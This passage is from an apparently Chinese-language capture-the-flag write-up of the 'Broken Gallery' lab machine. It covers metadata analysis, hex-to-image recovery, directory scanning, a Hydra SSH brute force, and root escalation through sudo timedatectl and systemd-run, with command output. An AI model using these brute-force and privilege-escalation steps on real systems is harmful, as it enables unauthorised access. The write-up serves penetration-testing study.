class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ exiftool *             <br>======== img_5terre.jpg<br>ExifTool Version Number         : 12.57<br>File Name                       : img_5terre.jpg<br>Directory                       : .<br>File Size                       : 265 kB<br>File Modification Date/Time     : 2019:08:09 04:11:02-04:00<br>File Access Date/Time           : 2023:06:26 05:04:52-04:00<br>File Inode Change Date/Time     : 2023:06:26 05:03:28-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : inches<br>X Resolution                    : 72<br>Y Resolution                    : 72<br>Image Width                     : 1200<br>Image Height                    : 900<br>Encoding Process                : Progressive DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:2:2 (2 1)<br>Image Size                      : 1200x900<br>Megapixels                      : 1.1<br>======== img_forest.jpg<br>ExifTool Version Number         : 12.57<br>File Name                       : img_forest.jpg<br>Directory                       : .<br>File Size                       : 117 kB<br>File Modification Date/Time     : 2019:08:09 04:11:02-04:00<br>File Access Date/Time           : 2023:06:26 05:04:52-04:00<br>File Inode Change Date/Time     : 2023:06:26 05:03:37-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : inches<br>X Resolution                    : 96<br>Y Resolution                    : 96<br>Image Width                     : 750<br>Image Height                    : 425<br>Encoding Process                : Progressive DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)<br>Image Size                      : 750x425<br>Megapixels                      : 0.319<br>======== img_lights.jpg<br>ExifTool Version Number         : 12.57<br>File Name                       : img_lights.jpg<br>Directory                       : .<br>File Size                       : 679 kB<br>File Modification Date/Time     : 2019:08:09 04:11:02-04:00<br>File Access Date/Time           : 2023:06:26 05:04:52-04:00<br>File Inode Change Date/Time     : 2023:06:26 05:03:44-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : None<br>X Resolution                    : 1<br>Y Resolution                    : 1<br>Profile CMM Type                : Little CMS<br>Profile Version                 : 2.1.0<br>Profile Class                   : Display Device Profile<br>Color Space Data                : RGB<br>Profile Connection Space        : XYZ<br>Profile Date Time               : 2012:01:25 03:41:57<br>Profile File Signature          : acsp<br>Primary Platform                : Apple Computer Inc.<br>CMM Flags                       : Not Embedded, Independent<br>Device Manufacturer             : <br>Device Model                    : <br>Device Attributes               : Reflective, Glossy, Positive, Color<br>Rendering Intent                : Perceptual<br>Connection Space Illuminant     : 0.9642 1 0.82491<br>Profile Creator                 : Little CMS<br>Profile ID                      : 0<br>Profile Description             : c2<br>Profile Copyright               : FB<br>Media White Point               : 0.9642 1 0.82491<br>Media Black Point               : 0.01205 0.0125 0.01031<br>Red Matrix Column               : 0.43607 0.22249 0.01392<br>Green Matrix Column             : 0.38515 0.71687 0.09708<br>Blue Matrix Column              : 0.14307 0.06061 0.7141<br>Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)<br>Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)<br>Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)<br>Image Width                     : 2988<br>Image Height                    : 1680<br>Encoding Process                : Baseline DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)<br>Image Size                      : 2988x1680<br>Megapixels                      : 5.0<br>======== img_mountains.jpg<br>ExifTool Version Number         : 12.57<br>File Name                       : img_mountains.jpg<br>Directory                       : .<br>File Size                       : 8.6 kB<br>File Modification Date/Time     : 2019:08:09 04:11:02-04:00<br>File Access Date/Time           : 2023:06:26 05:04:52-04:00<br>File Inode Change Date/Time     : 2023:06:26 05:03:51-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : JPEG<br>File Type Extension             : jpg<br>MIME Type                       : image/jpeg<br>JFIF Version                    : 1.01<br>Resolution Unit                 : None<br>X Resolution                    : 1<br>Y Resolution                    : 1<br>Image Width                     : 314<br>Image Height                    : 160<br>Encoding Process                : Baseline DCT, Huffman coding<br>Bits Per Sample                 : 8<br>Color Components                : 3<br>Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)<br>Image Size                      : 314x160<br>Megapixels                      : 0.050<br>======== README.md<br>ExifTool Version Number         : 12.57<br>File Name                       : README.md<br>Directory                       : .<br>File Size                       : 57 kB<br>File Modification Date/Time     : 2019:08:09 04:20:02-04:00<br>File Access Date/Time           : 2023:06:26 05:04:52-04:00<br>File Inode Change Date/Time     : 2023:06:26 05:03:09-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : TXT<br>File Type Extension             : txt<br>MIME Type                       : text/plain<br>MIME Encoding                   : us-ascii<br>Newlines                        : Unix LF<br>Line Count                      : 584<br>Word Count                      : 9335<br>    5 image files <span class="hljs-built_in">read</span><br></code></pre></td></tr></table></figure><p>有个色彩通道提取数据的提示<code>Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ exiftool -b img_lights.jpg <br>12.57img_lights.jpg.6789092019:08:09 04:11:02-04:002023:06:26 05:04:52-04:002023:06:26 05:03:44-04:00100644JPEGJPGimage/jpeg1 1011lcms528mntrRGB XYZ 2012:01:25 03:41:57acspAPPL00 000.9642 1 0.82491lcms0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0c2FB0.9642 1 0.824910.01205 0.0125 0.010310.43607 0.22249 0.013920.38515 0.71687 0.097080.14307 0.06061 0.7141curv▒��ck<br>   �?Q!�)�2▒;�FQw]�kpz���|�i�&#125;���0��curv▒��ck<br>                                             �?Q!�)�2▒;�FQw]�kpz���|�i�&#125;���0��curv▒��ck<br>                                                                                       �?Q!�)�2▒;�FQw]�kpz���|�i�&#125;���0��298816800832 22988 16805.01984<br></code></pre></td></tr></table></figure><p>没什么用，另外其中提到了一个 little cms，搜索后发现是个色彩管理的工具，也没有明显的漏洞，那关注点主要放在 md 文件上，打开文件发现是十六进制的数据</p><p><img src="/pic/6e130fde7173922c751af2f212422344_MD5.png"></p><p>直接问 chatgpt 吧</p><p><img src="/pic/ac0e51343e517f11244b96f6da97a93f_MD5.png"></p><p>原来是 jpg 文件，的确文件头和文件末尾都符合 jpg 文件的特征</p><blockquote><p>ZIP Archive (zip)，文件头：50 4B 03 04 文件尾：50 4B<br> RAR Archive (rar)，文件头：52 61 72 21<br> JPEG (jpg)，文件头：FF D8 FF 文件尾：FF D9<br> PNG (png)，文件头：89 50 4E 47 文件尾：AE 42 60 82<br> GIF (gif)，文件头：47 49 46 38 文件尾：00 3B<br> TIFF (tif)，文件头：49 49 2A 00 Windows Bitmap (bmp)，文件头：42 4D AE 0A 0B<br> 7-ZIP compressed file(7z) , 文件头：37 7A BC AF 27 1C<br> avi(RIFF) :52 49 46 46</p></blockquote><h2 id="十六进制转图片"><a href="#十六进制转图片" class="headerlink" title="十六进制转图片"></a>十六进制转图片</h2><p>接下来需要把这些十六进制转化为图片，一开始想使用编辑器，但是并没有实现转化为图片的效果，后续搜索了个在线工具：<a href="https://www.lzltool.com/hextoimage">在线十六进制转图片—LZL在线工具 (lzltool.com)</a>，转化成功。当然，这里要对数据进行预处理，将逗号，空格和 0x 都删去，借助于记事本就可以做到，然后将其复制粘贴到网页中，以防那个万一，这里我们还可以将图片下载到本地再次使用 exiftool 等工具进行判断是否有隐写信息</p><p><img src="/pic/3af14004003dccd8577ed5b2d7559599_MD5.png"></p><p>给的信息很有限，仅仅算是获得了几个用户名和一个 application 名。到这里有点束手无策，之前目录爆破也没什么结果，接下来手动尝试试试，将上述图片中的 <code>application</code>，<code>BROEKN</code>，<code>avrahamcohen</code> 作为目录逐一进行尝试，但都没什么结果。在这里卡了很久，甚至尝试了爆破<code>http://192.1.1.141/icons</code></p><blockquote><p>这里如果不使用在线网站的话，可以使用以下命令将文件转化为二进制，再利用 strings 和 head 配合来判断文件的内容和类型<br><code>xxd -r -ps README.md &gt; README.bin</code><br><code>strings README.bin | head -n 20</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]<br>└─$ sudo dirsearch -u http://192.1.1.141/icons<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.141/-icons_23-06-26_07-57-03.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-06-26_07-57-03.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.141/icons/<br><br>[07:57:03] Starting: <br>[07:57:04] 403 -  303B  - /icons/.ht_wsr.txt                               <br>[07:57:04] 403 -  308B  - /icons/.htaccess.sample                          <br>[07:57:04] 403 -  306B  - /icons/.htaccess.orig<br>[07:57:04] 403 -  306B  - /icons/.htaccess.bak1<br>[07:57:04] 403 -  306B  - /icons/.htaccess.save<br>[07:57:04] 403 -  305B  - /icons/.htaccessOLD2<br>[07:57:04] 403 -  306B  - /icons/.htaccess_orig<br>[07:57:04] 403 -  307B  - /icons/.htaccess_extra<br>[07:57:04] 403 -  304B  - /icons/.htaccess_sc<br>[07:57:04] 403 -  304B  - /icons/.htaccessBAK                              <br>[07:57:04] 403 -  297B  - /icons/.html<br>[07:57:04] 403 -  304B  - /icons/.htaccessOLD<br>[07:57:04] 403 -  296B  - /icons/.htm<br>[07:57:04] 403 -  302B  - /icons/.htpasswds<br>[07:57:04] 403 -  306B  - /icons/.htpasswd_test<br>[07:57:04] 403 -  303B  - /icons/.httr-oauth                               <br>[07:57:07] 200 -    5KB - /icons/README                                     <br>[07:57:07] 200 -   35KB - /icons/README.html<br></code></pre></td></tr></table></figure><h2 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h2><p>看了眼 WP，原来是将上述收集的信息（包括图片名中有实意的部分和恢复的图片中的人名、加粗的单词）转化为字典，然后 ssh 爆破……这么简单粗暴的思路我竟无言以对，虽然的确有道理，但是用户和密码都是 BROKEN 还是有点离谱（</p><blockquote><p>这里红队笔记 UP 提了一个角度：靶机实质上是实战环境的抽象，因此不能要求其信息是条理清晰地给到你，因为实战环境是更杂乱的。这个角度的确是过去没思考到的</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ hydra -L user -P passwd 192.1.1.141 ssh   <br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-26 08:25:54<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task<br>[DATA] attacking ssh://192.1.1.141:22/<br>[22][ssh] host: 192.1.1.141   login: broken   password: broken<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-26 08:25:59<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Broken_Gallery]<br>└─$ ssh broken@192.1.1.141<br>The authenticity of host <span class="hljs-string">&#x27;192.1.1.141 (192.1.1.141)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:2rSjxvkij5hWypyT/706pdaI6YAB0AOIXa7kVnMBDZs.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.1.1.141<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">broken@192.1.1.141\&#x27;</span>s password: <br>Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-21-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com/<br><br>762 packages can be updated.<br>458 updates are security updates.<br><br>Last login: Fri Aug  9 02:40:48 2019 from 10.11.1.221<br>broken@ubuntu:~$ <span class="hljs-built_in">ls</span><br>Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos<br>broken@ubuntu:~$ <span class="hljs-built_in">whoami</span><br>broken<br>broken@ubuntu:~$ <span class="hljs-built_in">id</span><br>uid=1000(broken) gid=1000(broken) <span class="hljs-built_in">groups</span>=1000(broken),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br>broken@ubuntu:~$ <span class="hljs-built_in">uname</span> -a<br>Linux ubuntu 4.4.0-21-generic <span class="hljs-comment">#37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br>broken@ubuntu:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:3b:1c:1c brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.141/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1524sec preferred_lft 1524sec<br>    inet6 fe80::46:b9bd:c17c:f599/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>broken@ubuntu:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> broken on ubuntu:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User broken may run the following commands on ubuntu:<br>    (ALL) NOPASSWD: /usr/bin/timedatectl<br>    (ALL) NOPASSWD: /sbin/reboot<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>去 gtfobins 搜一搜</p><p><img src="/pic/b6be9112069e2d27bb9a24d004f81a95_MD5.png"></p><h3 id="timedatectl-shell"><a href="#timedatectl-shell" class="headerlink" title="timedatectl shell"></a>timedatectl shell</h3><p><code>timedatectl</code> 可以新开 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">broken@ubuntu:~$ sudo timedatectl list-timezones<br>……<br>!/bin/bash<br>root@ubuntu:~<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@ubuntu:~<span class="hljs-comment"># whoami</span><br>root<br>root@ubuntu:~<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:3b:1c:1c brd ff:ff:ff:ff:ff:ff<br>    inet 192.1.1.141/24 brd 192.1.1.255 scope global dynamic ens33<br>       valid_lft 1233sec preferred_lft 1233sec<br>    inet6 fe80::46:b9bd:c17c:f599/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@ubuntu:~<span class="hljs-comment"># uname -a</span><br>Linux ubuntu 4.4.0-21-generic <span class="hljs-comment">#37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br><br></code></pre></td></tr></table></figure><h3 id="Linux-Polkit-helper-提权"><a href="#Linux-Polkit-helper-提权" class="headerlink" title="Linux Polkit helper 提权"></a>Linux Polkit helper 提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">broken@ubuntu:/etc$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>     1398     56 -rwsr-xr-x   1 root     root        54256 Mar 29  2016 /usr/bin/passwd<br>     1883    136 -rwsr-xr-x   1 root     root       136808 Mar 30  2016 /usr/bin/sudo<br>     1507     24 -rwsr-xr-x   1 root     root        23376 Jan 17  2016 /usr/bin/pkexec<br>      936     76 -rwsr-xr-x   1 root     root        75304 Mar 29  2016 /usr/bin/gpasswd<br>      616     40 -rwsr-xr-x   1 root     root        40432 Mar 29  2016 /usr/bin/chsh<br>     1335     40 -rwsr-xr-x   1 root     root        39904 Mar 29  2016 /usr/bin/newgrp<br>      614     52 -rwsr-xr-x   1 root     root        49584 Mar 29  2016 /usr/bin/chfn<br>     1962     24 -rwsr-xr-x   1 root     root        23304 Apr 15  2016 /usr/bin/ubuntu-core-launcher<br>    14572    384 -rwsr-xr--   1 root     dip        390888 Jan 29  2016 /usr/sbin/pppd<br>   429498     12 -r-sr-xr-x   1 root     root         9532 Aug  9  2019 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper<br>   577108     16 -r-sr-xr-x   1 root     root        14320 Aug  9  2019 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper<br>     5149     12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device<br>     9869     16 -rwsr-xr-x   1 root     root        14864 Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1<br>     4851     44 -rwsr-xr--   1 root     messagebus    42992 Apr  1  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   135504     20 -rwsr-xr-x   1 root     root          18664 Mar 10  2016 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox<br>      740    420 -rwsr-xr-x   1 root     root         428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br>   393321    140 -rwsr-xr-x   1 root     root         142032 Feb 17  2016 /bin/ntfs-3g<br>   393346     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping<br>   393393     28 -rwsr-xr-x   1 root     root          27608 Apr 13  2016 /bin/umount<br>   393309     40 -rwsr-xr-x   1 root     root          40152 Apr 13  2016 /bin/mount<br>   393373     40 -rwsr-xr-x   1 root     root          40128 Mar 29  2016 /bin/su<br>   393272     32 -rwsr-xr-x   1 root     root          30800 Mar 11  2016 /bin/fusermount<br>   393347     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6<br></code></pre></td></tr></table></figure><p>尝试 helper 提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">broken@ubuntu:/etc$ systemd-run -t bash<br>==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===<br>Authentication is required to manage system services or other units.                                                                                                                                                                        <br>Authenticating as: Broken,,, (broken)<br>Password: <br>==== AUTHENTICATION COMPLETE ===<br>Running as unit run-u42.service.                                                                                                                                                                                                            <br>Press ^] three <span class="hljs-built_in">times</span> within 1s to disconnect TTY.<br>root@ubuntu:/<span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>这里需要对敏感文件进行查看 <code>.bash_history</code>, <code>.viminfo</code>，无论其中是否有敏感信息都需要查看，对自己的要求不能降低</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">broken@ubuntu:~$ <span class="hljs-built_in">ls</span> -liah<br>total 124K<br>152057 drwxr-xr-x 17 broken broken 4.0K Aug  9  2019 .<br>131074 drwxr-xr-x  3 root   root   4.0K Aug  9  2019 ..<br>152710 -rw-------  1 broken broken 3.6K Jan  1  2018 .bash_history<br>152060 -rw-r--r--  1 broken broken  220 Aug  9  2019 .bash_logout<br>152058 -rw-r--r--  1 broken broken 3.7K Aug  9  2019 .bashrc<br>262259 drwx------ 14 broken broken 4.0K Aug  9  2019 .cache<br>281447 drwx------ 17 broken broken 4.0K Aug  9  2019 .config<br>290964 drwx------  3 root   root   4.0K Aug  9  2019 .dbus<br>281429 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Desktop<br>133504 -rw-r--r--  1 broken broken   25 Aug  9  2019 .dmrc<br>281443 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Documents<br>281430 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Downloads<br>152059 -rw-r--r--  1 broken broken 8.8K Aug  9  2019 examples.desktop<br>283212 drwx------  2 broken broken 4.0K Aug  9  2019 .gconf<br>282694 drwx------  3 broken broken 4.0K Aug  9  2019 .gnupg<br>133509 -rw-------  1 broken broken  636 Aug  9  2019 .ICEauthority<br>281655 drwx------  3 broken broken 4.0K Aug  9  2019 .<span class="hljs-built_in">local</span><br>152663 drwx------  4 broken broken 4.0K Aug  9  2019 .mozilla<br>281444 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Music<br>281445 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Pictures<br>152061 -rw-r--r--  1 broken broken  675 Aug  9  2019 .profile<br>281441 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Public<br>133508 -rw-r--r--  1 broken broken    0 Aug  9  2019 .sudo_as_admin_successful<br>281440 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Templates<br>281446 drwxr-xr-x  2 broken broken 4.0K Aug  9  2019 Videos<br>152728 -rw-------  1 broken broken 5.3K Aug  8  2019 